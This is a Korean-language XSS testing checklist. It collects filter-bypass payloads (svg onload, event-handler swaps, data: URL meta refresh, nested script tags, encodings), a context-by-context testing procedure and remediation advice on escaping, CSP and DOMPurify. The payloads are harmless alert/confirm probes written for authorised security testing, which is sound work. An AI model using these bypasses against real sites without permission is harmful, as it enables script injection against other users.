# XSS 점검 가이드 & 페이로드 모음 (Markdown 버전)

보안 점검 시 활용할 수 있는 **XSS 페이로드**, **점검 절차**, **대응 방안**을 한 문서로 정리했습니다.  
모든 예시는 **합법적이고 승인된 환경**에서의 연구/내부 점검 목적에만 사용하세요.

---
**TEST**
---

## 목차
- [개요](#개요)
- [추천 페이로드](#추천-페이로드)
- [점검 방법](#점검-방법)
- [상황별 점검 포인트](#상황별-점검-포인트)
- [패킷 관점 체크](#패킷-관점-체크)
- [대응 방안](#대응-방안)
- [유의 사항](#유의-사항)
- [참고](#참고)


## 개요
- 입력값이 **어느 컨텍스트**에 들어가는지(태그/속성/스크립트/URL 등)를 먼저 파악한 뒤, 해당 컨텍스트에서 **실행 가능**한 최소 페이로드부터 시도합니다.
- **패턴 기반 필터**만 믿지 말고, 아키텍처적으로 **신뢰되지 않은 입력을 HTML로 렌더링하지 않는** 방향을 우선 검토하세요.

> **주의**  
> 본 문서는 예시를 **코드 블록**으로만 제공합니다(자동 실행 없음). 승인되지 않은 시스템에 대한 테스트는 불법입니다.



## 추천 페이로드

### 1) 기본 테스트
```html
<script>alert(1111)</script>
```

### 2) `<script>` 태그가 차단될 때
```html
<details onpointerover=confirm(1111)></details>
```

### 3) 속성 값(value) 내부 삽입 (동작 유발 필요)
```html
" onkeydown=confirm(1111) contenteditable onfocus
```

### 4) 공백이 차단될 때
```html
<svg/onload=confirm(1111)/>
```

### 5) Polyglot XSS (컨텍스트 다중 호환)
> 여러 컨텍스트에서 동시에 유효하게 해석되도록 설계한 페이로드.  
> 프로젝트 성격에 맞춰 별도 섹션으로 확장하세요.



## 점검 방법

### A. 입력값 위치(컨텍스트) 파악
- **태그 속성 내부**
  ```html
  <input type="text" value="입력 값">
  ```
  따옴표 종료 후 이벤트 삽입:
  ```html
  <input value="test" onpointerover=confirm(1111)>
  ```

- **태그 외부(본문 영역)**
  ```html
  <a href="test.com">텍스트</a><script>alert(1111)</script>
  ```

### B. 필터링/치환 패턴 식별 및 우회
- 특수문자 제한(`"`, `<`, `(`, `=` 등) 시 **인코딩/대체 문자** 활용
- 이벤트 핸들러 제한(`onload`, `onerror` 등) 시 **대체 핸들러** 검토(예: `onpointerover`, `onkeydown`)
- `<script>` 차단 시 **대체 태그/기능** 활용
  ```html
  <svg onload=confirm(1111)>
  ```
  ```html
  <meta http-equiv="refresh" content="0;url=data:text/html,<script>alert(1111)</script>">
  ```

- **삭제/치환 기반 필터** 우회
  ```html
  <scr<script>ipt>alert(1111)</scr<script>ipt>
  ```

- **알림창 함수 필터링** 우회(속성/객체 경유)
  ```html
  <svg onload="window "/>
  ```

### C. 추가 문자열 주입(접두/접미) 대응
- 뒤에 문자열이 붙는 경우: `<!--` 등 **주석 처리**로 종료
- 앞에 붙는 경우: **태그 닫기** 후 새로운 구문으로 이탈



## 상황별 점검 포인트

- **특수문자 필터링**: `"`, `'`, `<>`, `()`, `:`, `=`
- **응답 맥락 탈출**: `" />`, `</script>` 등으로 컨텍스트 이탈 가능성 확인
- **대소문자 혼용**: `<sCriPt>` 등
- **이벤트 핸들러 필터링**: `onload`, `onerror`, `onclick` 차단 시 `ondrag`, `onfocus`, `onpointerover` 등 대체 검토
- **인코딩 시도**
  - URL: `%3Cscript%3E`
  - 유니코드: `<`
  - HTML 엔티티: `&#x3C;`
  - Base64: `data:text/html;base64,...`
- **태그 필터링 우회**: `<script>`, `<img>`, `<svg>` 차단 시 `<details>`, `<object>`, `<embed>` 등
- **하이퍼링크 기반**
  ```html
  <a href="javascript:confirm(1)">Click</a>
  ```
- **폼 전송 기반**
  ```html
  <form action="data:text/html,<script>alert(1111)</script>">
    <input type="submit">
  </form>
  ```
- **공백 필터링 우회**: `<svg/onload=...>` (환경/브라우저 의존성 주의)
- **hidden 필드 탈출 / iframe·object·embed·meta의 `data:` 스킴 활용** (환경 의존)

<details>
<summary><strong>추가 사례 모음 (접기/펼치기)</strong></summary>

- 알림창 전부 필터링 시 **리다이렉트/네비게이션** 등 대체 효과 검토  
  ```html
  <img src=x onerror="location.href='https://example.org'">
  ```

- `()` 필터링 시 **백틱** 활용 가능한지 확인  
  ```html
  alert`1`
  ```

- **응답 값 뒤에 문자열이 붙어 실패**할 때: 주석/닫기 태그로 무력화  
  ```html
  <img src onerror=prompt(1)<!--
  ```

- `<` 치환 시 앞에 `<` 추가 시도  
  ```html
  <x<svg/onload=prompt(1)/>/>
  ```
</details>



## 패킷 관점 체크
- **`location.hash` 사용 여부**: 응답 내 해당 참조가 있으면 `#<payload>`로 DOM XSS 가능성
- **POST→GET 변환**: 동일 파라미터가 GET으로도 반영되는지 확인 (렌더링 경로 차이로 성공 가능성↑)
- **전송 패킷엔 없지만 응답에 페이로드가 존재**: 응답에 있던 값을 **직접 전송**하여 반영되는지 재확인



## 대응 방안 (필수)
- **출력 이스케이프**: 컨텍스트별 적절한 이스케이프 적용
- **CSP(Content Security Policy)**: 스크립트 소스/인라인 제한, 보고 엔드포인트 설정
- **Sanitizer 적용**: 검증된 라이브러리(예: DOMPurify) 사용
- **아키텍처 개선**: 신뢰되지 않은 입력을 HTML로 렌더링하지 않도록 템플릿/렌더 경계 재설계

> **권장**  
> 패턴 기반 필터에만 의존하지 말고, **출력 컨텍스트 보안**과 **CSP**를 병행하세요.



## 유의 사항
- 고객사/사내 식별 가능 정보(도메인, 스크린샷, 내부 경로, 로그 등)는 **공개 저장소에 포함하지 마세요**.
- Git 이력(History)에 남은 민감 정보는 **레포 삭제/히스토리 재작성** 없이 완전 제거되지 않을 수 있습니다.



## 참고
- PortSwigger XSS Cheat Sheet  
  https://portswigger.net/web-security/cross-site-scripting/cheat-sheet



© 2025 XSS Checklist · 연구/내부 점검 용도
